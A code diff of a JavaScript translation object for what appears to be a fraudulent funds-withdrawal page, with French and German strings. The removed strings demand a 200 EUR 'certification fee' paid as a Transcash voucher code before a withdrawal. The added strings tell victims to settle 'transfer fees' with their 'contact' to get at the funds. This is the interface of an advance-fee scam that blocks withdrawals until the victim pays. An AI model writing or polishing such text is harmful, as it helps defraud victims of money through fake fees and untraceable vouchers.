@@ -47,7 +47,7 @@ document.getElementById('hub-tab').addEventListener('click', function() {
                 recentTransactions: "Transactions récentes",
                 withdraw: "Retirer",
                 confirmWithdrawal: "Confirmer le retrait",
-                enterPin: "Le retrait des fonds de votre compte authentifié nécessite des frais de certification d'un montant de 200 EUR. Pour procéder au retrait, veuillez fournir un code TRANSCASH d'une valeur équivalente à 200 EUR afin d'initier le processus de retrait."
+                enterPin: "Veuillez finaliser les frais de transfert auprès de votre contact pour pouvoir accéder aux fonds."
 
 ,
                 confirm: "Confirmer",
@@ -68,7 +68,7 @@ document.getElementById('hub-tab').addEventListener('click', function() {
                 recentTransactions: "Letzte Transaktionen",
                 withdraw: "Abheben",
                 confirmWithdrawal: "Abhebung bestätigen",
-                enterPin: "Der Abzug der Gelder von Ihrem authentifizierten Konto erfordert eine Zertifizierungsgebühr in Höhe von 200 EUR. Um mit dem Abzugsprozess fortzufahren, geben Sie bitte einen TRANSCASH-Code im Wert von 200 EUR ein."
+                enterPin: "Bitte schließen Sie die Überweisungsgebühren mit Ihrer Kontaktperson ab, um auf die Gelder zugreifen zu können."
 
 ,
                 confirm: "Bestätigen",
